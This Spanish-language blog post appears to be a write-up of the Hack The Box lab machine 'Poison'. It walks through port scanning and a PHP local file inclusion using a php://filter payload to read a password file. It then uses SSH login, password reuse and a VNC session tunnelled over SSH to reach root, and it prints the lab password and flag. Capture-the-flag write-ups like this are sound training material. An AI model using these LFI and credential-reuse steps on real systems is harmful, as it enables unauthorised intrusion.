---
layout: post
title: Poison
date: 2023-03-31
description:
img:
fig-caption:
tags: [eWPT, eJPT]
---
___

<center><img src="/writeups/assets/img/Poison-htb/Poison.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 10.10.10.84 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 16:23 GMT
Nmap scan report for 10.10.10.84
Host is up (0.045s latency).
Not shown: 60396 filtered tcp ports (no-response), 5137 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.84 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 16:24 GMT
Nmap scan report for 10.10.10.84
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)
|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)
|_  256 0b8fd57185901385618beb34135f943b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb```  analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.84
http://10.10.10.84 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.10.10.84], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```

La página principal se ve así:

<img src="/writeups/assets/img/Poison-htb/1.png" alt="">

Aplico fuzzing para descubrir archivos PHP

```null
gobuster fuzz -u http://10.10.10.84/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -b 404
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.84/FUZZ.php
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/31 16:57:26 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=321] http://10.10.10.84/browse.php

Found: [Status=200] [Length=289] http://10.10.10.84/index.php

Found: [Status=200] [Length=157] http://10.10.10.84/info.php

Found: [Status=200] [Length=68141] http://10.10.10.84/phpinfo.php

Found: [Status=200] [Length=20456] http://10.10.10.84/ini.php
```

Puedo ver una contraseña almacenada en un fichero de texto

```null
curl -s -X GET 'http://10.10.10.84/listfiles.php'
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

Aprovechando el LFI puedo ver la ruta absoluta

```null
curl -s -X GET 'http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=listfiles.php' | base64 -d
<?php
$dir = '/usr/local/www/apache24/data';
$files = scandir($dir);

print_r($files);
?>
```

Y descargar el archivo

```null
curl -s -X GET 'http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=/usr/local/www/apache24/data/pwdbackup.txt'
```

```null
cat data | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | tr -d "\n" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d; echo
Charix!2#4%6&8(0
```

Me conecto por SSH

```null
ssh charix@10.10.10.84

charix@Poison:~ % cat user.txt 
eaacdfb2d141b72a589233063604209c
```

# Escalada

En el directorio personal hay un comprimido

```null
charix@Poison:~ % ls
secret.zip	user.txt
```

Está protegido por contraseña

```null
unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
```

Se reutiliza la de antes

Ejecuto un ```ps -faux``` para ver los procesos que se están ejecutando. Encuentro el siguiente:

```null
root   529  0.0  0.9 23620  8872 v0- I    19:46    0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc
```

Para poder tener conectividad con el VNC, me conecto por SSH aplicando un Dinamic Port Forwarding

```null
sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84 -D 1080
```

```null
proxychains vncviewer -passwd secret localhost:5901
```

Gano acceso al sistema y puedo ver la segunda flag

<img src="/writeups/assets/img/Poison-htb/2.png" alt="">